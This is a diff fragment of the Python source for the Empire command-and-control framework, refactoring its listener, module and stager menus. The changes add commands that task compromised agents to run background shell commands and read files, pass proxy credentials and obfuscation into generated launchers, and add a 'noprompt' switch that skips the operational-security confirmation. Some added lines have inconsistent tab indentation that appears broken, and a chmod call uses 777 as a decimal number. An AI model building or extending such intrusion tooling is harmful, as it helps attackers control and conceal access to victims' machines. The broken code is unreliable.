+""" % (line)
+            # task the agent with this shell command
+            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(cmd))
+            # update the agent log
+            msg = "Tasked agent to cat file %s" % (line)
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+
+    def do_pwd(self, line):
+        "Print working directory"
+
+        command = "cwd = os.getcwd(); print cwd"
+        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", command)
+        msg = "Tasked agent to print current working directory"
+        self.mainMenu.agents.save_agent_log(self.sessionID, msg)
 
     def do_whoami(self, line):
         "Print the currently logged in user"
@@ -2635,6 +2839,24 @@ class PythonAgentMenu(cmd.Cmd):
         else:
             print helpers.color("[!] Please provide a valid zipfile path", color="red")
 
+    def do_shellb(self, line):
+        """Execute a shell command as a background job"""
+        cmd = line.strip()
+        if self.mainMenu.modules.modules['python/management/osx/shellb']:
+            module = self.mainMenu.modules.modules['python/management/osx/shellb']
+            if line.strip() != '':
+                module.options['Command']['Value'] = line.strip()
+
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
+            module_menu = ModuleMenu(self.mainMenu, 'python/management/osx/shellb')
+            msg = "[*] Tasked agent to execute %s in the background" % (str(module.options['Path']['Value']))
+            print helpers.color(msg,color="green")
+            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+            module_menu.do_execute("")
+
+        else:
+            print helpers.color("[!] python/management/osx/shellb module not loaded")
+            
     def do_viewrepo(self, line):
         "View the contents of a repo. if none is specified, all files will be returned"
         repoName = line.strip()
@@ -2677,14 +2899,12 @@ class PythonAgentMenu(cmd.Cmd):
     #     return helpers.complete_path(text,line)
 
 
-class ListenersMenu(cmd.Cmd):
+class ListenersMenu(SubMenu):
     """
     The main class used by Empire to drive the 'listener' menu.
     """
     def __init__(self, mainMenu):
-        cmd.Cmd.__init__(self)
-
-        self.mainMenu = mainMenu
+        SubMenu.__init__(self, mainMenu)
 
         self.doc_header = 'Listener Commands'
 
@@ -2694,44 +2914,9 @@ class ListenersMenu(cmd.Cmd):
         # display all active listeners on menu startup
         messages.display_active_listeners(self.mainMenu.listeners.activeListeners)
 
-    # def preloop(self):
-    #     traceback.print_stack()
-
-    # print a nicely formatted help menu
-    # stolen/adapted from recon-ng
-    def print_topics(self, header, commands, cmdlen, maxcol):
-        if commands:
-            self.stdout.write("%s\n" % str(header))
-            if self.ruler:
-                self.stdout.write("%s\n" % str(self.ruler * len(header)))
-            for command in commands:
-                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
-            self.stdout.write("\n")
-
-
-    def emptyline(self):
-        pass
-
-
     def do_back(self, line):
         "Go back to the main menu."
         raise NavMain()
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
-    def do_exit(self, line):
-        "Exit Empire."
-        raise KeyboardInterrupt
-
 
     def do_list(self, line):
         "List all active listeners (or agents)."
@@ -2809,7 +2994,7 @@ class ListenersMenu(cmd.Cmd):
 
     def do_launcher(self, line):
         "Generate an initial launcher for a listener."
-
+        
         parts = line.strip().split()
         if len(parts) != 2:
             print helpers.color("[!] Please enter 'launcher <language> <listenerName>'")
@@ -2821,10 +3006,20 @@ class ListenersMenu(cmd.Cmd):
         if listenerName:
             try:
                 # set the listener value for the launcher
+                listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]
                 stager = self.mainMenu.stagers.stagers['multi/launcher']
                 stager.options['Listener']['Value'] = listenerName
                 stager.options['Language']['Value'] = language
                 stager.options['Base64']['Value'] = "True"
+                try:
+                    stager.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
+                    stager.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
+                except:
+                    pass
+                if self.mainMenu.obfuscate:
+                    stager.options['Obfuscate']['Value'] = "True"
+                else:
+                    stager.options['Obfuscate']['Value'] = "False"
                 print stager.generate()
             except Exception as e:
                 print helpers.color("[!] Error generating launcher: %s" % (e))
@@ -2886,13 +3081,11 @@ class ListenersMenu(cmd.Cmd):
         return [s[offs:] for s in names if s.startswith(mline)]
 
 
-class ListenerMenu(cmd.Cmd):
+class ListenerMenu(SubMenu):
 
     def __init__(self, mainMenu, listenerName):
 
-        cmd.Cmd.__init__(self)
-
-        self.mainMenu = mainMenu
+        SubMenu.__init__(self, mainMenu)
 
         if listenerName not in self.mainMenu.listeners.loadedListeners:
             print helpers.color("[!] Listener '%s' not currently valid!" % (listenerName))
@@ -2905,39 +3098,6 @@ class ListenerMenu(cmd.Cmd):
 
         # set the text prompt
         self.prompt = '(Empire: ' + helpers.color("listeners/%s" % (listenerName), 'red') + ') > '
-
-
-    def emptyline(self):
-        """
-        If any empty line is entered, do nothing.
-        """
-        pass
-
-
-    def do_back(self, line):
-        "Go back a menu."
-        return True
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
-    def do_exit(self, line):
-        "Exit Empire."
-        raise KeyboardInterrupt
-
 
     def do_info(self, line):
         "Display listener module options."
@@ -2962,10 +3122,16 @@ class ListenerMenu(cmd.Cmd):
 
         try:
             # set the listener value for the launcher
+            listenerOptions = self.mainMenu.listeners.activeListeners[self.listenerName]
             stager = self.mainMenu.stagers.stagers['multi/launcher']
             stager.options['Listener']['Value'] = self.listenerName
             stager.options['Language']['Value'] = parts[0]
             stager.options['Base64']['Value'] = "True"
+            try:
+                stager.options['Proxy']['Value'] = listenerOptions['options']['Proxy']['Value']
+                stager.options['ProxyCreds']['Value'] = listenerOptions['options']['ProxyCreds']['Value']
+            except:
+                pass
             print stager.generate()
         except Exception as e:
             print helpers.color("[!] Error generating launcher: %s" % (e))
@@ -3063,15 +3229,14 @@ class ListenerMenu(cmd.Cmd):
         return [s[offs:] for s in languages if s.startswith(mline)]
 
 
-class ModuleMenu(cmd.Cmd):
+class ModuleMenu(SubMenu):
     """
     The main class used by Empire to drive the 'module' menu.
     """
     def __init__(self, mainMenu, moduleName, agent=None):
 
-        cmd.Cmd.__init__(self)
+        SubMenu.__init__(self, mainMenu)
         self.doc_header = 'Module Commands'
-        self.mainMenu = mainMenu
 
         try:
             # get the current module/name
@@ -3090,10 +3255,7 @@ class ModuleMenu(cmd.Cmd):
         except Exception as e:
             print helpers.color("[!] ModuleMenu() init error: %s" % (e))
 
-    # def preloop(self):
-    #     traceback.print_stack()
-
-    def validate_options(self):
+    def validate_options(self, prompt):
         "Ensure all required module options are completed."
 
         # ensure all 'Required=True' options are filled in
@@ -3127,8 +3289,9 @@ class ModuleMenu(cmd.Cmd):
                         print helpers.color("[!] Error: module needs to run in an elevated context.")
                         return False
 
-        # if the module isn't opsec safe, prompt before running
-        if ('OpsecSafe' in self.module.info) and (not self.module.info['OpsecSafe']):
+        # if the module isn't opsec safe, prompt before running (unless "execute noprompt" was issued)
+        if prompt and ('OpsecSafe' in self.module.info) and (not self.module.info['OpsecSafe']):
+
             try:
                 choice = raw_input(helpers.color("[>] Module is not opsec safe, run? [y/N] ", "red"))
                 if not (choice.lower() != "" and choice.lower()[0] == "y"):
@@ -3139,48 +3302,6 @@ class ModuleMenu(cmd.Cmd):
 
         return True
 
-
-    def emptyline(self):
-        pass
-
-
-    # print a nicely formatted help menu
-    # stolen/adapted from recon-ng
-    def print_topics(self, header, commands, cmdlen, maxcol):
-        if commands:
-            self.stdout.write("%s\n" % str(header))
-            if self.ruler:
-                self.stdout.write("%s\n" % str(self.ruler * len(header)))
-            for command in commands:
-                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
-            self.stdout.write("\n")
-
-
-    def do_back(self, line):
-        "Go back a menu."
-        return True
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
-    def do_exit(self, line):
-        "Exit Empire."
-        raise KeyboardInterrupt
-
-
     def do_list(self, line):
         "Lists all active agents (or listeners)."
 
@@ -3190,7 +3311,6 @@ class ModuleMenu(cmd.Cmd):
             self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
         else:
             print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")
-
 
     def do_reload(self, line):
         "Reload the current module."
@@ -3260,12 +3380,18 @@ class ModuleMenu(cmd.Cmd):
     def do_usemodule(self, line):
         "Use an Empire PowerShell module."
 
-        module = line.strip()
+        # Strip asterisks added by MainMenu.complete_usemodule()
+        module = line.strip().rstrip("*")
 
         if module not in self.mainMenu.modules.modules:
             print helpers.color("[!] Error: invalid module")
         else:
-            module_menu = ModuleMenu(self.mainMenu, line, agent=self.module.options['Agent']['Value'])
+            _agent = ''
+            if 'Agent' in self.module.options:
+                _agent = self.module.options['Agent']['Value']
+	    
+	        line = line.strip("*")
+            module_menu = ModuleMenu(self.mainMenu, line, agent=_agent)
             module_menu.cmdloop()
 
 
@@ -3277,7 +3403,11 @@ class ModuleMenu(cmd.Cmd):
     def do_execute(self, line):
         "Execute the given Empire module."
 
-        if not self.validate_options():
+	prompt = True
+	if line == "noprompt":
+	    prompt = False
+
+        if not self.validate_options(prompt):
             return
 
         if self.moduleName.lower().startswith('external/'):
@@ -3286,7 +3416,7 @@ class ModuleMenu(cmd.Cmd):
             self.module.execute()
         else:
             agentName = self.module.options['Agent']['Value']
-            moduleData = self.module.generate()
+            moduleData = self.module.generate(self.mainMenu.obfuscate, self.mainMenu.obfuscateCommand)
 
             if not moduleData or moduleData == "":
                 print helpers.color("[!] Error: module produced an empty script")
@@ -3467,15 +3597,13 @@ class ModuleMenu(cmd.Cmd):
         return [s[offs:] for s in names if s.startswith(mline)]
 
 
-class StagerMenu(cmd.Cmd):
+class StagerMenu(SubMenu):
     """
     The main class used by Empire to drive the 'stager' menu.
     """
     def __init__(self, mainMenu, stagerName, listener=None):
-        cmd.Cmd.__init__(self)
+        SubMenu.__init__(self, mainMenu)
         self.doc_header = 'Stager Menu'
-
-        self.mainMenu = mainMenu
 
         # get the current stager name
         self.stagerName = stagerName
@@ -3489,7 +3617,6 @@ class StagerMenu(cmd.Cmd):
             # resolve the listener ID to a name, if applicable
             listener = self.mainMenu.listeners.get_listener(listener)
             self.stager.options['Listener']['Value'] = listener
-
 
     def validate_options(self):
         "Make sure all required stager options are completed."
@@ -3506,48 +3633,6 @@ class StagerMenu(cmd.Cmd):
             return False
 
         return True
-
-
-    def emptyline(self):
-        pass
-
-
-    # print a nicely formatted help menu
-    # stolen/adapted from recon-ng
-    def print_topics(self, header, commands, cmdlen, maxcol):
-        if commands:
-            self.stdout.write("%s\n" % str(header))
-            if self.ruler:
-                self.stdout.write("%s\n" % str(self.ruler * len(header)))
-            for command in commands:
-                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
-            self.stdout.write("\n")
-
-
-    def do_back(self, line):
-        "Go back a menu."
-        return True
-
-
-    def do_agents(self, line):
-        "Jump to the Agents menu."
-        raise NavAgents()
-
-
-    def do_listeners(self, line):
-        "Jump to the listeners menu."
-        raise NavListeners()
-
-
-    def do_main(self, line):
-        "Go back to the main menu."
-        raise NavMain()
-
-
-    def do_exit(self, line):
-        "Exit Empire."
-        raise KeyboardInterrupt
-
 
     def do_list(self, line):
         "Lists all active agents (or listeners)."
@@ -3616,7 +3701,6 @@ class StagerMenu(cmd.Cmd):
 
     def do_generate(self, line):
         "Generate/execute the given Empire stager."
-
         if not self.validate_options():
             return
 
@@ -3647,7 +3731,6 @@ class StagerMenu(cmd.Cmd):
                 os.chmod(savePath, 777)
 
             print "\n" + helpers.color("[*] Stager output written out to: %s\n" % (savePath))
-
         else:
             print stagerOutput
 
